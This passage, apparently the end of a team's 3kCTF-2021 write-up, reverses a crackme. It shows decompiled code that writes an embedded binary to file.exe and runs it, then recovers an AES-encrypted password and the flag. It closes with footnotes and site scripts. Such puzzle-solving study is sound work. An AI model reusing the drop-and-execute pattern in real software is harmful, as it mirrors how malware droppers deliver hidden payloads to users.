  FILE <span style="color:#f92672">*</span>File; <span style="color:#75715e">// ST20_8
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> Str; <span style="color:#75715e">// [rsp+30h] [rbp-186B8h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v6; <span style="color:#75715e">// [rsp+31h] [rbp-186B7h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v7; <span style="color:#75715e">// [rsp+32h] [rbp-186B6h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v8; <span style="color:#75715e">// [rsp+33h] [rbp-186B5h]
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// Omitted
</span><span style="color:#75715e"></span>  Str <span style="color:#f92672">=</span> <span style="color:#ae81ff">77</span>;
  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">90</span>;
  v7 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">112</span>;
  v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
  <span style="color:#75715e">// Omitted
</span><span style="color:#75715e"></span>  v16384 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v16385 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v16386 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v16387 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  v16388 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  memset(<span style="color:#f92672">&amp;</span>v16389, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">83616u</span>i64);
  File <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;file.exe&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>);
  fwrite(<span style="color:#f92672">&amp;</span>Str, <span style="color:#ae81ff">1u</span>i64, <span style="color:#ae81ff">0x4000u</span>i64, File);
  fclose(File);
  sub_140001000(<span style="color:#e6db74">&#34;./file.exe&#34;</span>);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;</code></pre></div>
<p>It is pretty evident that there is another binary called <code>file.exe</code>, and we are able to build it from the above source code.</p>

<h3 id="part-v-microsofts-cryptographic-provider">Part V. Microsoft's Cryptographic Provider<a hidden class="anchor" aria-hidden="true" href="#part-v-microsofts-cryptographic-provider">#</a></h3>

<p>We are given the key <code>the3kctfteamftw!!</code> and 29 bytes of the ciphertext:</p>
<pre tabindex="0"><code>5b d6 a5 3f f2 17 88 ed  47 d7 2c a1 a4 5e ff e7
e6 06 8c 99 a1 99 ee 6e  6f f8 4a b4 2c</code></pre>
<p>The cryptographic details in <code>file.exe</code> is pretty hairy. Since it is using <em>Microsoft Enhanced RSA and AES Cryptographic Provider</em> and there are no documentation, I don't know how did they derive the AES-key from the 17-byte seed key, nor the mode of operation they used. The only thing I knew is they used <code>SHA256</code> to derive the AES-key and encrypt with <code>AES128</code>.</p>

<p>However, I recalled that there is a challenge in <em>Cyber Apocalypse 2021</em> that used Microsoft's API with <code>SHA256</code> and <code>AES128</code> too. Maybe we can refer to the write-ups? <em>harrier</em> referred me to the write-up<sup class="footnote-ref" id="fnref:alienware-writeup"><a class="footnote" href="#fn:alienware-writeup">12</a></sup> that contain its Python implementation. Well... I better assume that is a black-box and modify the source code to fit my goal... Wait, what is it?</p>

<h3 id="part-vi-understanding-the-objective">Part VI. Understanding the Objective<a hidden class="anchor" aria-hidden="true" href="#part-vi-understanding-the-objective">#</a></h3>

<p>From <code>file.exe</code>, the objective is to find a message such that its the first 29 bytes of the ciphertext is given as <code>5b d6 a5 ... 4a b4 2c</code> as specified above.</p>

<div class="alert info">
  <strong>Note.</strong> The code has an different checking condition checks if <code>target_c[0] ^ c[0] ^ target_c[1] ^ c[1] ^ ... = 0</code>. However, this loose condition is also enforced in the author&rsquo;s remaining challenges <em>Crackme</em> and <em>Layers</em>. I think it is safe to assume that the real intention is <code>target_c[i] == c[i]</code> for all <code>i</code>&rsquo;s&hellip;
</div>
  

<p>The ciphertext comes from the clipboard, which is overwritten in <code>password_manager.exe</code>. There is an input box in the password manager. To copy something to the clipboard, one must have <code>C0pYm3</code> copied in the clipboard. Otherwise the password manager will be closed. After that, the content in the input box will be encrypted with the ROT-4 cipher we mentioned in part III and will be copied to the clipboard. Hence, our objective is to find <code>password</code> that satisfies the below condition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">AES128(ROT4(password), key)[:29] == target_ciphertext</code></pre></div>
<p>Since it is hard for me to switch to my Windows machine, I decide to patch the script and send it to <em>harrier</em> for me to run. There are some bugs and <em>cdemirer</em> helped fixing. Eventually, we are able to get it working. There are multiple candidates for the password. The most reasonable one is <code>AsIOnc3Said!F4ceb00KIs3viL!=#</code> - and we have the flag 20 minutes before the CTF ends!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">3k{AsIOnc3Said!F4ceb00KIs3viL!=#}</code></pre></div><div class="footnotes">

<hr>

<ol>
<li id="fn:robin-decryption"><a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption">https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption</a>
 <a class="footnote-return" href="#fnref:robin-decryption"><sup>[return]</sup></a></li>
<li id="fn:w3-spec"><a href="https://www.w3.org/TR/REC-png-961001">https://www.w3.org/TR/REC-png-961001</a>
 <a class="footnote-return" href="#fnref:w3-spec"><sup>[return]</sup></a></li>
<li id="fn:tea-signs"><a href="https://twitter.com/codexgigassys/status/765743255917125632">https://twitter.com/codexgigassys/status/765743255917125632</a>
 <a class="footnote-return" href="#fnref:tea-signs"><sup>[return]</sup></a></li>
<li id="fn:tea-wiki"><a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm</a>
 <a class="footnote-return" href="#fnref:tea-wiki"><sup>[return]</sup></a></li>
<li id="fn:factordb-1"><a href="http://factordb.com/index.php?id=1100000002583673291">http://factordb.com/index.php?id=1100000002583673291</a>
 <a class="footnote-return" href="#fnref:factordb-1"><sup>[return]</sup></a></li>
<li id="fn:alpertron"><a href="https://www.alpertron.com.ar/ECM.HTM">https://www.alpertron.com.ar/ECM.HTM</a>
 <a class="footnote-return" href="#fnref:alpertron"><sup>[return]</sup></a></li>
<li id="fn:factordb-2"><a href="http://factordb.com/index.php?id=1100000002583690582">http://factordb.com/index.php?id=1100000002583690582</a>
 <a class="footnote-return" href="#fnref:factordb-2"><sup>[return]</sup></a></li>
<li id="fn:factordb-3"><a href="http://factordb.com/index.php?id=1100000002583705568">http://factordb.com/index.php?id=1100000002583705568</a>
 <a class="footnote-return" href="#fnref:factordb-3"><sup>[return]</sup></a></li>
<li id="fn:factordb-4"><a href="http://factordb.com/index.php?id=1100000002583719246">http://factordb.com/index.php?id=1100000002583719246</a>
 <a class="footnote-return" href="#fnref:factordb-4"><sup>[return]</sup></a></li>
<li id="fn:tcpdf"><a href="https://tcpdf.org/examples/example_049/">https://tcpdf.org/examples/example_049/</a>
 <a class="footnote-return" href="#fnref:tcpdf"><sup>[return]</sup></a></li>
<li id="fn:buerhaus"><a href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/">https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/</a>
 <a class="footnote-return" href="#fnref:buerhaus"><sup>[return]</sup></a></li>
<li id="fn:alienware-writeup"><a href="https://ctftime.org/writeup/27932">https://ctftime.org/writeup/27932</a>
 <a class="footnote-return" href="#fnref:alienware-writeup"><sup>[return]</sup></a></li>
</ol>
</div>

</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/3kctf/">3kctf</a></li>
    </ul>
    <nav class="paginav">
      <a class="prev" href="https://b6a.black/posts/2021-08-19-defcon-gold-bug/">
        <span class="title">« Prev Page</span>
        <br>
        <span>DEFCON Gold Bug Puzzle 2021</span>
      </a>
      <a class="next" href="https://b6a.black/posts/2021-04-25-htbctf-crypto/">
        <span class="title">Next Page »</span>
        <br>
        <span>Cyber Apocalypse 2021: Wii Phit &amp; Hyper Metroid</span>
      </a>
    </nav>
  </footer>
</article>
<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    3kCTF-2021 Writeup
  </a>
  <div class="js-toc"></div>
</aside>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
    headingSelector: 'h1, h2, h3, h4',
    orderedList: false,
    headingLabelCallback: s => s.substr(0, s.length-1),
    collapseDepth: 2
  });
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
<script type="text/javascript">
  (function () {
    const vizPrefix = "language-viz-";
    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
      let engine;
      x.getAttribute("class").split(" ").forEach(function (cls) {
        if (cls.startsWith(vizPrefix)) {
          engine = cls.substr(vizPrefix.length);
        }
      });
      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
      x.parentNode.insertBefore(image.documentElement, x);
      x.style.display = 'none'
      x.parentNode.style.backgroundColor = "white"
    });
  })();
</script>
    </main><footer class="footer">
    <span>&copy; 2023 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
